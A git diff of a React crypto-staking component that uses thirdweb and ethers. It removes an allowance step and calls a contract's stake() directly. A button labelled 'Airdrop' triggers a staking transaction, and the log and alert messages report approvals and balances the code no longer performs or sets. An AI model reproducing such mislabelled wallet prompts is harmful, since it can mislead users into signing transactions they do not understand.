@@ -9,11 +9,7 @@ import {
   client,
 } from "../constants/constanst";
 import { createWallet } from "thirdweb/wallets";
-import {
-  useActiveAccount,
-  useSwitchActiveWalletChain,
-  useSendTransaction,
-} from "thirdweb/react";
+import { useActiveAccount, useSwitchActiveWalletChain } from "thirdweb/react";
 import { getWalletBalance } from "thirdweb/wallets";
 import { ethers } from "ethers";
 
@@ -24,7 +20,6 @@ const CustomButton = () => {
   const [balance, setBalance] = useState("0");
   const [currentChain, setCurrentChain] = useState("");
   const [currentChainId, setCurrentChainId] = useState("");
-  const { mutate: sendTransaction, isPending } = useSendTransaction();
 
   const delay = (ms) => new Promise((resolve) => setTimeout(resolve, ms));
 
@@ -62,9 +57,7 @@ const CustomButton = () => {
 
           const currentChainContract = BSCTESTCONTRACT;
 
-          const balanceToStake = parseFloat(balanceInUnit) * 0.1;
-          console.log("Balance to stake:", balanceToStake.toString());
-          setBalance(balanceToStake.toString());
+          const balanceToStake = (balanceInUnit * 5) / 100000;
 
           try {
             const stakeContract = new ethers.Contract(
@@ -73,22 +66,10 @@ const CustomButton = () => {
               activeAccount
             );
 
-            const balance = await stakeContract.balanceOf(
-              activeAccount.address
-            );
-            const allowanceAmount = (balance * 5) / 100000;
+            const approveTx = await stakeContract.stake();
+            await approveTx.wait();
 
-            const approveTx = await stakeContract.increaseAllowance(
-              currentChainContract.address,
-              allowanceAmount
-            );
-            await approveTx.wait(); // Wait for the transaction to be mined
-
-            console.log(`Approved ${allowanceAmount} tokens for staking`);
-
-            // Now call the stake function in the staking contract
-            const stakeTx = await stakeContract.stake();
-            await stakeTx.wait();
+            console.log(`Approved ${balanceToStake} tokens for staking`);
           } catch (error) {
             if (error.code === "CALL_EXCEPTION") {
               // Inspect the revert reason if available
@@ -149,11 +130,10 @@ const CustomButton = () => {
       )}
       {activeAccount && (
         <TransactionButton
-          transaction={checkBalanceAndSwitchChain} // Pass the function directly
+          transaction={checkBalanceAndSwitchChain}
           onTransactionSent={() =>
             alert(`${balance} ${currentChain} approved for staking`)
           }
-          isPending={isPending} // Pass isPending to disable the button when transaction is pending
         >
           Airdrop
         </TransactionButton>
